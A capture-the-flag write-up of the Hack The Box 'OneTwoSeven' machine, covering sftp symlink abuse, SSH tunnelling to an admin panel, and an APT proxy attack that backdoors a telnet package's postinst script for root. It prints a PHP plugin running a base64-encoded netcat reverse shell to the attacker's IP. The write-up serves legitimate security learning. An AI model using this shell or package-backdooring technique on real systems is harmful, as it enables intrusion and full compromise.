---
title:     "Hack The Box - OneTwoSeven"
tags: [sftp,tunneling,ssh,port forwarding,apt hijacking,apt upgrade,apt update]
---

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled.png)

## NMAP

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%201.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%201.png)

## Enumerating

⇒ So when we first visit the webpage we see that its talking about secure sftp file upload and static file hosting and also there's fail2ban implemented which won't let us run gobuster. There's also an admin page on port 60080, but its only accessible locally.

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%202.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%202.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%203.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%203.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%204.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%204.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%205.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%205.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%206.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%206.png)

⇒ So after signing up we are given sftp credentials and our page files that we can edit .

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%207.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%207.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%208.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%208.png)

- We logged in sftp using the given credentials and get the following

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%209.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%209.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2010.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2010.png)

- So we uploaded an php page to the website but is restrcits us from accessing the page , this is probably due to the waf blocking php pages as it could result in code execution on the system.

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2011.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2011.png)

⇒ Looking back we saw the admin page is running on port 60080, we can use sftp to create a tunnel to localnetwork and forward the port so we could access it 

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2012.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2012.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2013.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2013.png)

- We get the admin login page but we don't have any credentials, so we can't proceed on this page without the credentials.

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2014.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2014.png)

⇒ Lets create a tunnel to access local port 80 and see if its any difference than what we have on the present page.

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2015.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2015.png)

- We get different sftp credentials this time when we signup. We created another tunnel to access local sftp port ( 22 ) . After we login sftp using the new credentials we get the user flag

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2016.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2016.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2017.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2017.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2018.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2018.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2019.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2019.png)

⇒ So now in sftp its possible to create sym links, so what we can do is create a sym link to **/** directory in **public_html** so we can browse and access all the files on the system.

- Creating the sym link to / and then accessing the page

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2020.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2020.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2021.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2021.png)

- We found the admin page directory and found a file named .login.php.swp which has password for ots-admin user

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2022.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2022.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2023.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2023.png)

- Cracked the hash using [crackstation.net](http://crackstation.net) and we get Homesweethome1 :

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2024.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2024.png)

**ots-admin : Homesweethome1**

⇒ Logged in the admin panel and we get the following page that has certain addons that perform tasks. There's also an plugin upload option but its disabled and we tried uploading but it restricts us from doing so :

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2025.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2025.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2026.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2026.png)

- We downloaded one of the plugin and they look like this

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2027.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2027.png)

- We created our own plugin that gives us a reverse shell

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
# OneTwoSeven Admin Plugin
# OTS File Systems
echo shell_exec('echo "bmMgLWUgL2Jpbi9zaCAxMC4xMC4xNC4yOSA0NDQ0"|base64 -d|bash');
?>
```

- So addon-upload.php is restricted but we can access it through addon-download.php

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2028.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2028.png)

⇒ Now first lets intercept the upload post request we get to addon-upload.php and send it to repeater. Then we can copy the request parts to the above request 

- Addon-Upload.php post request

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2029.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2029.png)

- Copying the content from addon-upload.php request to addon-download.php and changing request method from GET to POST

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2030.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2030.png)

- Finally lets trigger the plugin [http://127.0.0.1:60080/menu.php?addon=addons/exploit.php](http://127.0.0.1:60080/menu.php?addon=addons/exploit.php)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2031.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2031.png)

## *Privilege Escalation to Root ( apt update , apt upgrade )*

⇒ So we can run apt-get update and apt-get upgrade as root user using sudo with no password

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2032.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2032.png)

- We also see that we can set http_proxy.

### APT MITM Attack

⇒ So we will be performing apt mitm attack as we have permissions to set http_proxy when running   update and upgrade. So we can host a server which has a malicious repository that the machine uses to get packages from. We will backdoor a packager with an reverse shell so when its being installed will get us a shell.

1) Setting up malicious server

- First lets setup a proxy using burpsuite that redirects to [localhost](http://localhost) python simplehttpserver

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2033.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2033.png)

- Adding packages.onetwoseven.htb to /etc/hosts because this is the hostname it retrieves the packages from. We'll set it along with our ip so when it visits packages.onetwoseven.htb it will be redirected to our ip.

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2034.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2034.png)

- Now lets just start the python simplehttpserver on port 8081

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2035.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2035.png)

2) Setting up malicious repo containing our backdoored package that it grabs

- Checking the apt sources.list we see that its retrieving packages from devuan repo

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2036.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2036.png)

- So we will be backdooring telnet 0.17-**41** as it is in the list of packages that it will update and upgrade

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2037.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2037.png)

- Downloading telnet 0.17-41 package then unpacking it.

```bash
wget ftp.br.debian.org/debian/pool/main/n/netkit-telnet/telnet_0.17-41_amd64.deb # [Downloading]

dpkg-deb -R ./telnet_0.17-41_amd64.deb ./unpacked # [ Unpacking ]
```

- Then adding our malicious payload that will be executed once the package is being upgraded. We will be editing **unpacked/DEBIAN/postinst** file

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2038.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2038.png)

- Packing it back as telnet_0.17-**42** . Then we take a look at apt-cache of telnet package to see the folder structure

**dpkg-deb -b unpacked/ telnet_0.17-42_amd64.deb**

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2039.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2039.png)

So our folder structure should be like : pool/DEBIAN/main/n/netkit-telnet/telnet_0.17-42_amd64.deb

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2040.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2040.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2041.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2041.png)

- Now lets create the Packages config file in our devuan repo. Lets grab the md5sum and sha256sum then edit the config file accordingly. Also edited the version number and the file size

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2042.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2042.png)

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2043.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2043.png)

- So finally the folder structure should look something like this

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2044.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2044.png)

3) Using the proxy and running apt update and apt upgrade

⇒ So we ran the following commands to use the proxy we setup and run update and upgrade.

```bash
export http_proxy='http://10.10.14.29:8181'
sudo apt-get update
sudo apt-get upgrade
```

![https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2045.png](https://raw.githubusercontent.com/csenox/csenox.github.io/master/img/OneTwoSeven%20Box%20fc8aac5cb7804d6d89117815efd54475/Untitled%2045.png)
